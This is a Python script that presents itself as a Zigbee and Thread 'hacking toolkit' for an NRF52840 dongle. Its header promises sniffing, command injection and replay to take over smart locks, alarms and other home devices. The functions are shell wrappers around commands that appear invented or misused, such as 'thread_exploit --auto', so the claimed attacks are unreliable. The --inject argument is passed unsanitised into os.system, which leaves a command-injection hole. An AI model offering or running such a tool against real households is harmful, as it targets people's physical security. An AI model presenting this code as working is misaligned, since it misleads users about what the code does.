import argparse
import os
import time

# -------------------------------------------
# NRF52840 Zigbee & Thread Hacking Toolkit
# -------------------------------------------
# Features:
# - Sniff Zigbee smart home devices (locks, alarms, lights, Nest, Alexa, etc.)
# - Inject and replay Zigbee commands to take control of devices
# - Exploit Matter/Thread networks used in smart home IoT
# - Uses ZBOSS Sniffer with Wireshark for Zigbee network analysis
# - Uses Zigbee2MQTT for taking over Zigbee devices
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: ZBOSS Sniffer, Zigbee2MQTT
# - Python 3.x
#
# Usage:
# 1. Sniff Zigbee packets:
#    python nrf52840_zigbee_hacking.py --sniff
# 2. Inject Zigbee commands:
#    python nrf52840_zigbee_hacking.py --inject "AC120F56"
# 3. Replay captured Zigbee commands:
#    python nrf52840_zigbee_hacking.py --replay
# 4. Scan for active Zigbee networks:
#    python nrf52840_zigbee_hacking.py --scan
# 5. Exploit Matter/Thread IoT networks:
#    python nrf52840_zigbee_hacking.py --thread_attack
# -------------------------------------------

def scan_zigbee():
    """Scans for active Zigbee networks and logs them."""
    print("[+] Scanning for active Zigbee networks...")
    os.system("zigbee2mqtt --scan")

def sniff_zigbee():
    """Sniffs Zigbee packets using ZBOSS Sniffer and Wireshark."""
    print("[+] Sniffing Zigbee packets...")
    os.system("zboss_sniffer -c 11 -w zigbee_capture.pcap")

def inject_zigbee(packet_data):
    """Injects Zigbee commands to test device security."""
    print(f"[+] Injecting Zigbee command: {packet_data}")
    os.system(f"zboss_sniffer -i {packet_data}")

def replay_zigbee():
    """Replays captured Zigbee commands to exploit devices."""
    print("[+] Replaying captured Zigbee command...")
    os.system("zboss_sniffer -r zigbee_capture.pcap")

def thread_exploit():
    """Exploits Thread/Matter IoT networks."""
    print("[+] Attacking Matter/Thread IoT networks...")
    os.system("thread_exploit --auto")

def main():
    parser = argparse.ArgumentParser(description="NRF52840 Zigbee & Thread Hacking Toolkit")
    parser.add_argument("--scan", action='store_true', help="Scan for active Zigbee networks")
    parser.add_argument("--sniff", action='store_true', help="Sniff Zigbee packets")
    parser.add_argument("--inject", type=str, help="Inject a Zigbee command (hex string)")
    parser.add_argument("--replay", action='store_true', help="Replay captured Zigbee commands")
    parser.add_argument("--thread_attack", action='store_true', help="Exploit Matter/Thread IoT networks")
    args = parser.parse_args()

    if args.scan:
        scan_zigbee()
    elif args.sniff:
        sniff_zigbee()
    elif args.inject:
        inject_zigbee(args.inject)
    elif args.replay:
        replay_zigbee()
    elif args.thread_attack:
        thread_exploit()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
